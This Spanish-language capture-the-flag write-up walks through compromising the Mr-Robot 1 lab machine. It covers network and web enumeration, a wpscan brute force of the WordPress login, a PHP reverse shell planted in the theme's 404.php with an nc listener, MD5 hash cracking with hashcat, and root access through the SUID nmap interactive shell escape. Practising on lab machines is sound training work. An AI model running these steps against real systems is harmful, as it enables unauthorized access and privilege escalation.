# Mr-Robot 1

- Dificultad: ⭐️⭐️⭐️⭐️
- Number: 1
- Section: Linux, RedTeam

<p align="center">
  <img src="https://github.com/Hexix23/Imagenes/blob/main/Mr.-Robot-contara-como-surgio-fSociety-en-un-comic.jpg" alt="ImagenCustom"/>
</p>

# → Foothold:

- Lo primero que vamos a realizar es identificar la maquina objetivo en nuestra red.
    - Para esto utilizaremos el comando { **arp-scan** }:
        
        ```bash
        sudo arp-scan -I eth0 192.168.1.0/24
        ```
        
    
- Procedemos a escanear los diferentes puertos y servicios abiertos en la máquina:
    
    ```bash
    sudo nmap -sCV -n -sS --min-rate 2000 -p- 192.168.1.12 -v
    ```
    
    ```latex
    PORT    STATE  SERVICE  VERSION
    22/tcp  closed ssh
    80/tcp  open   http     Apache httpd
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-title: Site doesn't have a title (text/html).
    |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
    |_http-server-header: Apache
    443/tcp open   ssl/http Apache httpd
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
    |_http-title: Site doesn't have a title (text/html).
    | ssl-cert: Subject: commonName=www.example.com
    | Issuer: commonName=www.example.com
    | Public Key type: rsa
    | Public Key bits: 1024
    | Signature Algorithm: sha1WithRSAEncryption
    | Not valid before: 2015-09-16T10:45:03
    | Not valid after:  2025-09-13T10:45:03
    | MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
    |_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
    |_http-server-header: Apache
    MAC Address: 08:00:27:FC:E8:B4 (Oracle VirtualBox virtual NIC)
    ```
    
    Podemos observar que tiene tanto el puerto 80 { HTT } como el puerto 443 { HTTPS }.
    
- Procedemos a realizar el proceso de FUZZING / CRAWLING para identificar algún directorio / archivo / tecnología interesante para poder proceder a identificar algún vector de entrada.
    - GOBUSTER
        
        ```latex
        gobuster dir -u http://192.168.1.12/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -s -t150 2>/dev/null
        ```
        
        ![gobuster](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled.png)
        
    - WHATWEB
        
        ```bash
        whatweb 192.168.1.12
        ```
        
        ![whatweb](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%201.png)
        
    - NIKTO ( OSCP BAN )
        
        ```bash
        nikto --host http://192.168.1.12/
        ```
        
        ![nikto](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%202.png)
        

---

- Web
    
    ![web](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%203.png)
    

- Comandos:
    - fsociety —> video
    - prepare —> video
    - inform —> galería de imágenes
    - questions —> galería de imágenes
    - wakeup —> video
    - join —> nueva BASH
    
    De todos estos comandos no sacamos nada, están para hacernos perder el tiempo.
    

![comandos](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%204.png)

- Una vez en este punto, decidí empezar a buscar en los directorios / archivos que anteriormente hemos sacado con **GOBUSTER.**
    - Accedemos al archivo ***robots.txt***
        
        ![robots.txt](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%205.png)
        
        - Nos encontramos con ***key-1-of-3.txt ( primer key obtenida )***
    - Accedemos al archivo ***fsocity.dic*** y se nos descarga un archivo de forma local
        
        ![diccionario](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%206.png)
        
        - Tiene toda la pinta de que es un diccionario de posibles claves.
        - Tenemos un panel de acceso de wordpress, por lo que podemos intentar realizar un ataque de fuerza bruta contra el login.
        - El único problema que tenemos ahora es buscar un usuario valido para el mismo y realizar el ataque de fuerza bruta contra ese usuario.
        - Al estar realizando una máquina cuya temática es la serie MrRobot, probé el usuario ***elliot***.
            
            ![login](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%207.png)
            
        - Teniendo un usuario válido, lanzaremos el ataque de fuerza bruta con la herramienta **wpscan** ( puedes utilizar cualquier otra ).
        - Para asegurarnos de que el ataque sea lo mas optimo posible, eliminaremos todos los registros que se repitan en el diccionario que nos hemos descargado antes.
        
        ```bash
        sort fsocity.dic | uniq > fsocity-sorted.dic
        ```
        
        - Lanzamos el ataque:
        
        ```bash
        wpscan --url http://192.168.1.12/ --wp-content-dir wp-admin --usernames elliot --passwords fsocity-sorted.dic  
        ```
        
        ![wpscan](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%208.png)
        
        > **Username:** elliot
        **Password:** ER28-0652
        > 

# → User:

- Accedemos con las credenciales obtenidas:

![dashboard](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%209.png)

- Después de investigar y navegar por el ***Dashboard***, encontré en ***“Appearance → Editor”*** diversos archivos ***.php*** que podemos modificar directamente.
- Tenemos un archivo ***404.php***, el cual podemos intuir que te saltará este archivo cuando nos produzca este error, por lo que la idea es copiar el código de una reversa ***php*** dentro y forzar dicho error para establecer una conexión reversa.

![reversa](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%2010.png)

- Ponemos a la escucha nuestra máquina, por el puerto indicado anteriormente ( 9999 ) → Puedes poner cualquiera:

```bash
nc -lvnp 9999
```

![conexionReversa](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%2011.png)

- Vamos a “vitaminizar” nuestra *shell*, a una que sea un poco más interactiva, en este caso no la vamos a *upgradear* 100% interactiva ya que no nos va a hacer falta.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

```bash
export SHELL=bash
```

![shell](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%2012.png)

- Nos dirigimos al directorio /home/robot.
- Nos encontramos dos archivos ahí:
    - key-2-of-3.txt → La cual no podemos acceder ya que pertenece al usuario Robot
    - password.raw-md5 → El cual contiene:
    
    ```bash
    robot:c3fcd3d76192e4007dfb496cca67e13b
    ```
    
- Tiene toda la pinta que el archivo password.raw-md5 nos va a permitir cambiar al otro usuario del sistema, **robot**.
- Vamos a utilizar hashcat para crackear dicho archivo y probar a sacar información de el

```bash
hashcat -a 0 -m 0 c3fcd3d76192e4007dfb496cca67e13b  /usr/share/wordlists/rockyou.txt
```

- Tras un rato nos saca:

```bash
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

Accedemos al usuario robot con la contraseña crackeada anteriormente.

```bash
su robot
```

Con esto ya podemos acceder al contenido de key-2-of-3.txt ( segunda key )

![key2](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%2013.png)

# → Root:

- Nos quedaría por ultimo elevar privilegios.
- Tras una batería de pruebas, a la hora de buscar ficheros con permisos de **SUID** nos topamos con esto:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![suid](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%2014.png)

- Podemos mejorar este comando con:

```bash
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
```

- Con este podremos ver tanto los permisos como el usuario de los mismos

![permisos](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%2015.png)

- Vemos que tenemos el binario de nmap que se ejecuta como **root**, lo cual es bastante raro en este tipo de CTFS.
- Comprobamos la versión del mismo:

```bash
nmap --version
```

![nmap](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%2016.png)

- Tras una breve búsqueda en internet, tenemos que esta versión es vulnerable y puede ejecutar una *shell* desde el modulo ***interactive*** de nmap.
- Al ejecutarse como root, podemos presuponer que al ejecutar una *shell* una vez dentro del modulo de NMAP, se ejecutara como SUDO.

```bash
nmap --interactive
```

![interactive](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%2017.png)

- Ejecutamos una *shell*:

```bash
!sh
```

![shellNmap](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%2018.png)

`BINGO!!`

- Ahora ya nos dirigimos al directorio root y encontramos la ultima flag dentro:

```bash
cd /root
ls
cat key-3-of-3.txt
```

![final](https://github.com/Hexix23/Imagenes/blob/main/Imagenes/Untitled%2019.png)
